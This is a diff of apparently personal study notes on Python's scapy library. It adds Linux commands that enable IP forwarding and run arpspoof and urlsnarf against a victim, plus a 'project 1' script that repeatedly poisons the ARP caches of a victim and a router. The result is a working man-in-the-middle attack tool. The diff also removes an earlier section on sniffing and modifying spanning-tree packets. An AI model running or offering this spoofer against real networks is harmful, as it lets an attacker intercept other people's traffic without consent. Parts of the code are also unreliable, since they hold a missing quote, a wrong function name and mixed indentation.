@@ -1,3 +1,4 @@
+#scapy 
 import scapy.all
 
 #sniffing packets, you can filter on packet type in this example arp
@@ -19,51 +20,75 @@ packet = scapy.all.arp(op="is-at", hwsrc=source_mac, psrc=source_ip, hwdst=dest_
 #sending a packet 
 scapy.all.send(packet, verbose=False) 
 
+#netifaces 
+#save ur mac
+mac = netifaces.ifaddresses("eth0)[netifaces.AF_LINK]
+my_mac = mac[0]["addr"]
+
+#save ur ip 
+ip = netifaces.ifaddresses("eth0")[netifaces.AF_INET]
+my_ip = ip[0]["addr"]
+
+
+#linux stuff 
+arp -a                                  #shows the arp table 
+ip -s -s neigh flush all                #flushing the arp table 
+apt-get install python3 
+apt-get install python3-pip 
+pip install --pre scapy[basics]
+mousepad &                              #opening the mousepad editor 
+
+apt-get update 
+apt-get install dsniff                  #this has the arp spoof program 
+netdiscover                             #discover ip + mac address 
+echo 1 > /proc/sys/net/ipv4/ip_forward  #enable ip forwarding
+arpspoof -i eth0 -t <victim-ip> <target-ip> 
+urlsnarf -i eth0 
+
+wget http://google.com
 
 
 
 
 
+project 1 #arp spoofer 
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+import scapy.all 
+import sys 
+import netifaces 
+import time 
+
+def arp_spoof(dest_ip, dest_mac, source_ip, source_mac):
+  packet = scapy.all.ARP(op="is-at", hwsrc=source_mac, psrc=source_ip, hwdst=dest_mac, pdst=dest_ip)
+	scapy.all.send(packet, verbose=False) 
 
 
+def arp_restore(dest_ip, dest_mac, source_ip, source_mac):
+	packet = scapy.all.ARP(op="is-at", hwsrc=source_mac, psrc=source_ip, hwdst=dest_mac, pdst=dest_ip)
+	scapy.all.send(packet, verbose=False) 
+	
 
+def main():
+	victim_ip = sys.argv[1]
+	router_ip = sys.argv[2]
+	victim_mac = scapy.all.getmacbyip(victim_ip) 
+	router_mac = scapy.all.getmacbyip(router_ip) 
+	mac = netifaces.ifaddresses("eth0")[netifaces.AF_LINK] 
+	my_mac = mac[0]["addr"] 
+	ip = netifaces.ifaddresses("eth0")[netifaces.AF_INET]
+	my_ip = ip[0]["addr"]
+	
+	try:
+		while True:
+			arp_spoof(victim_ip, victim_mac, router_ip, my_mac)
+			arp_spoof(router_ip, router_mac, victim_ip, my_mac)
+			time.sleep(1)
+	except KeyboardInterrupt: 
+		print(" restore " )  
+		arp_restore(router_ip, router_mac, victim_ip, victim_mac)
+		arp_restor(victim_ip, victim_mac, router_ip, router_mac) 
+		quit()
+		
+main() 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-#sniffing packets 
-#example sniffing spanning tree packets, spanning tree sends all data to the common destination mac address for spanning tree: 01:80:c2:00:00:00
-#this will sniff all packets using ethernet(layer) with a destination mac address of 01:80:c2:: to the count of 1 if you want to sniff more packets u increase the count
-packet = scapy.all.sniff(filter="ether dst 01:80:c2:00:00:00", count=1)     
-
-#to view your packet you state the object u create with the positional vallue which specifies the count, note you can also add a second positional vallue for viewing just a layer. 
-packet[0].show() 
-packet[0] 
-
-#edditing packets, changing vallues of our captured packet
-packet[0].pathcost = 1 
-
-#sending packets, sending our modified packet
-scapy.all.sendp(packet[0])
-
-#get mac by ip 
-mac = scapy.all.getmacbyip("192.168.1.1") 
 
